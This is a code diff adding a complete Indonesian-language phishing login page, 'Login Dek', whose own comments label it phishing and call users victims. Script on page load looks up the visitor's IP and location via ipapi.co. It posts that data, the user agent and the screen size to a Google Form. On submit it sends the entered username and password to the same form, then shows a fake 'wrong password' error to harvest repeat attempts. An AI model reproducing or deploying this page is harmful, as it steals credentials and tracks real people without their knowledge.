@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login Dek</title>
+  <style>
+    /* Reset dan styling dasar */
+    * {
+      box-sizing: border-box;
+      margin: 0; padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    body {
+      background: linear-gradient(135deg, #4c6ef5, #15aabf);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+    }
+    .login-wrapper {
+      background: white;
+      padding: 40px 35px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      width: 360px;
+      text-align: center;
+    }
+    h1 {
+      color: #3366cc;
+      margin-bottom: 25px;
+      font-weight: 700;
+      font-size: 1.8rem;
+    }
+    p.description {
+      color: #555;
+      font-size: 1rem;
+      margin-bottom: 30px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 10px 0 20px 0;
+      border: 1.8px solid #ddd;
+      border-radius: 8px;
+      font-size: 1rem;
+      transition: border-color 0.3s ease;
+      outline: none;
+    }
+    input[type="text"]:focus, input[type="password"]:focus {
+      border-color: #3366cc;
+      box-shadow: 0 0 6px rgba(51, 102, 204, 0.5);
+    }
+    button {
+      width: 100%;
+      padding: 14px 0;
+      background-color: #3366cc;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      font-size: 1.1rem;
+      cursor: pointer;
+      font-weight: 700;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #274b8f;
+    }
+    .error-message {
+      margin-top: 15px;
+      color: #d93025;
+      font-weight: 600;
+      display: none;
+    }
+    footer {
+      margin-top: 30px;
+      font-size: 0.85rem;
+      color: #999;
+    }
+  </style>
+  <script>
+    // Kirim data device & IP korban ke Google Form
+    function sendTrackingData(data) {
+      const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSccytGC2WuEsCS77bBfCJWGTay-F4aRoVHsE91uYqjhy5injA/formResponse"; // Ganti dengan Google Form milik pelaku
+      
+      const formData = new URLSearchParams();
+      formData.append("entry.788507197", data.ip);
+      formData.append("entry.1012471099", data.city + ", " + data.region + ", " + data.country);
+      formData.append("entry.843398416", navigator.userAgent);
+      formData.append("entry.1860026126", screen.width + "x" + screen.height);
+      formData.append("entry.1051281717", new Date().toString());
+
+      fetch(formURL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: formData
+      });
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+      fetch("https://ipapi.co/json")
+        .then(response => response.json())
+        .then(sendTrackingData)
+        .catch(() => sendTrackingData({ ip: "unknown", city: "-", region: "-", country: "-" }));
+    });
+
+    // Proses login (phishing)
+    function handleLogin(event) {
+      event.preventDefault();
+
+      const errorBox = document.getElementById("errorBox");
+      errorBox.style.display = "none";
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value;
+
+      if (!username || !password) {
+        errorBox.textContent = "Mohon isi username dan password.";
+        errorBox.style.display = "block";
+        return;
+      }
+
+      // Kirim data login korban ke Google Form
+      const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSccytGC2WuEsCS77bBfCJWGTay-F4aRoVHsE91uYqjhy5injA/formResponse"; // Ganti sesuai form asli
+
+      const formData = new URLSearchParams();
+      formData.append("entry.64470032", username);
+      formData.append("entry.1560675049", password);
+      formData.append("entry.1051281717", new Date().toString());
+
+      fetch(formURL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: formData
+      });
+
+      // Tampilkan pesan error palsu agar korban coba lagi
+      errorBox.textContent = "Username atau password salah. Silakan coba lagi.";
+      errorBox.style.display = "block";
+    }
+  </script>
+</head>
+<body>
+  <div class="login-wrapper">
+    <h1>Login Dek</h1>
+    <p class="description">Masukkan username dan password nya dek.</p>
+    <form id="loginForm" onsubmit="handleLogin(event)">
+      <input type="text" id="username" name="username" placeholder="Username atau Email" autocomplete="username" />
+      <input type="password" id="password" name="password" placeholder="Kata Sandi" autocomplete="current-password" />
+      <button type="submit">Masuk</button>
+      <div id="errorBox" class="error-message"></div>
+    </form>
+    <footer>
+      &copy; Copyright 2025 YanzzLZ. All rights reserved.
+    </footer>
+  </div>
+</body>
+</html>
